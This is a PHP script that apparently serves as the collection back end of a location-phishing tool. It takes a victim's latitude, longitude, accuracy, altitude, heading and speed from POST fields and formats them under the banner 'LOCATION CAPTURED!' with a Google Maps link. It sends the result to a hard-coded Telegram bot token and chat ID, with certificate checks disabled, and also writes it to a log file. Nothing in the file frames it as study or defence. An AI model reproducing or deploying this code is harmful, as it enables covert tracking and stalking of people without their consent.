<?php
// ******************************************
// CONFIGURATION
// ******************************************
$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM";
$chatId = "-1003598938463";
// ******************************************

// Receive Data
$lat = $_POST['Lat'];
$lon = $_POST['Lon'];
$acc = $_POST['Acc'];
$alt = $_POST['Alt'];
$dir = $_POST['Dir'];
$spd = $_POST['Spd'];

// Clean data for Google Maps Link (Remove " deg" text)
$lat_clean = str_replace(" deg", "", $lat);
$lon_clean = str_replace(" deg", "", $lon);
$google_maps = "https://www.google.com/maps/place/" . $lat_clean . "," . $lon_clean;

// Format Message
$message = "<b>📍 LOCATION CAPTURED!</b>\n\n";
$message .= "<b>🌍 Latitude:</b> <code>" . $lat . "</code>\n";
$message .= "<b>🌎 Longitude:</b> <code>" . $lon . "</code>\n\n";
$message .= "<b>🎯 Accuracy:</b> " . $acc . "\n";
$message .= "<b>🏔 Altitude:</b> " . $alt . "\n";
$message .= "<b>🧭 Direction:</b> " . $dir . "\n";
$message .= "<b>🚗 Speed:</b> " . $spd . "\n\n";
$message .= "<b>🗺 <a href='" . $google_maps . "'>Open in Google Maps</a></b>";

// Send to Telegram
$website = "https://api.telegram.org/bot" . $botToken;
$params = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML',
    'disable_web_page_preview' => false
];

$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

// Save Log
$f = fopen('../../logs/result.txt', 'w+');
fwrite($f, $message);
fclose($f);
?>
